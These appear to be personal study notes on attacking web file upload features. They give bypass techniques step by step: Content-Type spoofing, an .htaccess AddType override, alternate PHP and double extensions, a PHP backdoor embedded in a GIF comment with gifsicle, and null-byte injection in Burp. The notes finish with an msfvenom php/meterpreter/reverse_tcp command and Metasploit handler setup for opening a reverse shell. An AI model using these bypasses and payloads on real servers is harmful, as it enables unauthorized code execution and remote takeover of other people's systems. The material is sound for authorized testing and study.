

File Upload Vulnerability Basics : 

  - Attacker Abuses a file upload feature to upload malicious script 
  - Script is executed and allows for further attacks 
	- Webshell 
  - Filter Based on Content-Type,  extension names, Size etc 


1. Beating Content-Type Check in file Uploads : 

Content Type Check  :

  - Common Practise to check for Content-Types 
	- image/gif
 
  - Attaker can use an intercepting proxy and change the Content-Type to what is expected   

Note : To Bypass this Content Type Check just intercept the request and change the Content-Type to the favourable extention 


2. Bypassing Blacklists in File Upload : 

  Case Sensitive : 
  - Try to change the extension of file from .php  .PHP
 
  if this does not work :  
  
  Required Condition to Bypass : 
  
  - AllowOverride is turned on to All 
	- allows  .htaccess to work 

first we will upload .htaccess file to instruct the server to allow PHP file to run 

.htaccess file : 

	AddType application/x-httpd-php PHP
	// you can also use the different extention like : blah 
	// AddType application/x-httpd-php blah 

   
upload this file and then upload the backdoor with .PHP extention then it will run 

    

3. Bypassing Blacklists using PHPx : 

php3, php4, php5 

  - php 3/4/5 are allowed extension and supported by Default 


4. Bypassing whitelists Using Double Extensions in File Upload 

	ex : $allowed = array("gif");
	
  Double Extensions : 
	ussage : 
		simple-backdoor.php.gif
	modify the apache2 file as shown in Insecure Configuration remove the dollar 


5. Defeating getimagesize() Check in file Upload : 

  - array getimagesize(string $filename, [, array &$imageinfo])
	
  - getimagesize() function determine the size of any given image file and return the dimension along with the file type 
    and height/width text string to be used inside a normal HTML IMG tag and the correspondant hTTP content type. 

Beating getimagesize() :

  - Use getimagesize()
	- check if it is a image 
	- chech mime to verify image type 

  - Whitelist based approach to only allow gif  
	
  - Double Extension Allowed 

Note : 
	Almost all image formats tent to support attaching meta information inside of it which include comments, and other
	thing as well. Now we take a perfect gif file and add the php backdoor in the comment section of gif image.
	    	
	- Choose any gif file 
	- install the tool : gifsicle 
	- gifsicle --comment " comments " <input.gif> output.php.gif
	 

6. Null Byte Injection file Uploads : 

  - It does not require multiple extension support in php configuraion 
  - Intercept the request and change the file name to file.phpA.gif and now we replace 'A' with null character 
  - go to hex menu in burp suite 
  - replace the 41 with 00 and send the request 

------------------------------------------------------------------------------------------------------------------

Exploiting File Upload to get Meterpreter : 

File upload to meterpreter : 

  - Create a php meterpreter 
	command : msfvenom  -p php/meterpreter/reverse_tcp LHOST=IPADDRESS LPORT=PORTNUMBER  -f raw > meterpreter.php  
	remove the guard bit 
  - Upload using file Upload vulnerability 

  - Setup handler on Attacker machine 
	commands : set payload php/meterpreter/reverse_tcp 
	set LHOST, LPORT 
	

